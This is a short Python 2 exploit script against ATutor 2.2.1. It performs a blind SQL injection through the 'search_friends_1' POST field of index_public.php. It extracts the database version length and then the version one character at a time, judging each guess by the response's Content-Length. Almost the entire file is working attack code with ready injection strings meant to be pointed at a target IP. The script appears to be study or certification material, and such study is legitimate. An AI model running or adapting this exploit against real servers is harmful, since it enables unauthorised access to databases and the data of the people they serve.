#!/usr/bin/python2

'''
This exploit targets ATutor 2.2.1 SQL Injection. It retrieves the database version information by sending post requests to index_public.php.
'''

import requests
import sys

# Compares ascii numeric values 32~125 to each character in the returned query result.
# If a match is found, return it.
def compareEachChar(ip, payload):
	for i in range(32, 126):
		url = "http://%s/ATutor/mods/_standard/social/index_public.php" % ip

		# Body and headers
		headers = {'Content-Type': 'application/x-www-form-urlencoded'}
		data = {
		"rand_key": "1",
		"search": "Search",
		"search_friends_1": payload.replace("[CHAR]", str(i))
		}

		r = requests.post(url,headers=headers,data=data)
		content_length = int(r.headers['Content-Length'])
		
		# The response content length is greater than 6100 when the sql query succeeded.
		if (content_length > 6100):
			if i is not None:
				sys.stdout.write(chr(i))
				sys.stdout.flush()
				return chr(i)
	return ''

# This gets version information from the target.
def getVersion(ip):

	# Get version length
	print "Retrieving the length of the version..."
	version_length, version = '',''
	
	# Get the length of the version, assuming that the length of the version is not greater than 999.
	for i in range(1,4):
		inj_str_version_length = "a')/**/or/**/(select/**/ascii(substring((select/**/char_length(version())),%d,1)))=[CHAR]#" % i
		version_length += compareEachChar(ip, inj_str_version_length)
	print("\nThe target's version length: " + version_length)

	# Get the version
	print("Retrieving the version...")
	for i in range(1,(int(version_length)+1)):
		inj_str_version = "a')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]#" % i
		version += compareEachChar(ip, inj_str_version)
	print("\nThe target database's version: " + str(version))

def main():
	if len(sys.argv) != 2:
		print "Usage: %s <target>"  % sys.argv[0]
		print "E.g. : %s 192.168.111.111"  % sys.argv[0]
		sys.exit(-1)

	ip = sys.argv[1]
	getVersion(ip)

if __name__ == "__main__":
    main()
